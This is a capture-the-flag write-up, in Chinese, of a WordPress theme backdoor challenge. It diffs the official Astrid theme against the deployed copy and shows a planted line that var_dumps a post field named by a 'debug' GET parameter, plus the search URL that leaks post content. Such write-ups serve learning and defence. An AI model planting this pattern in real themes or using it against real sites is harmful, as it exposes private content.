@@ -1,0 +1,78 @@
+wordpress1 flag 提供线索 Try to found backdoor in my theme :D
+使用的主题为astrid，版本为1.11（可以看 style.css 开头）。
+==========================================================
+astrid
+指向官方链接https://athemes.com/theme/astrid/
+只能下载最新版本
+需要找到历史版本
+搜索关键字 astrid svn
+==========================================================
+svn checkout https://themes.svn.wordpress.org/astrid/
+└─$ diff 1.11 astrid -r
+Only in 1.11: screenshot.png
+diff '--color=auto' -r 1.11/template-parts/content-search.php astrid/template-parts/content-search.php
+25a26
+>       <!-- debug:<?php var_dump($wp_query->post->{'post_'.(string)($_GET['debug']?:'type')}); ?> -->
+
+
+搜索  搜索出结果后会调用 content-search
+==========================================================
+搜索框搜索，在源码中会看到，每条结果中都会有<!-- debug
+
+修改主题<?php var_dump($wp_query->post); ?>
+$wp_query->post
+的结构
+object(WP_Post)#3855 (24) {
+  ["ID"]=>
+  int(2)
+  ["post_author"]=>
+  string(1) "1"
+  ["post_date"]=>
+  string(19) "2021-06-15 10:30:00"
+  ["post_date_gmt"]=>
+  string(19) "2021-06-15 02:30:00"
+  ["post_content"]=>
+  string(1189) "<!-- wp:paragraph -->......"
+  ["post_title"]=>
+  string(12) "示例页面"
+  ["post_excerpt"]=>
+  string(0) ""
+  ["post_status"]=>
+  string(7) "publish"
+  ["comment_status"]=>
+  string(6) "closed"
+  ["ping_status"]=>
+  string(4) "open"
+  ["post_password"]=>
+  string(0) ""
+  ["post_name"]=>
+  string(11) "sample-page"
+  ["to_ping"]=>
+  string(0) ""
+  ["pinged"]=>
+  string(0) ""
+  ["post_modified"]=>
+  string(19) "2021-06-15 10:30:00"
+  ["post_modified_gmt"]=>
+  string(19) "2021-06-15 02:30:00"
+  ["post_content_filtered"]=>
+  string(0) ""
+  ["post_parent"]=>
+  int(0)
+  ["guid"]=>
+  string(32) "http://127.0.0.1:8080/?page_id=2"
+  ["menu_order"]=>
+  int(0)
+  ["post_type"]=>
+  string(4) "page"
+  ["post_mime_type"]=>
+  string(0) ""
+  ["comment_count"]=>
+  string(1) "0"
+  ["filter"]=>
+  string(3) "raw"
+}
+
+https://wp.hackme.inndy.tw/archives/date/2013/10?s&debug=content
+==========================================================
+可以在测试环境中上传修改后的主题，进行测试
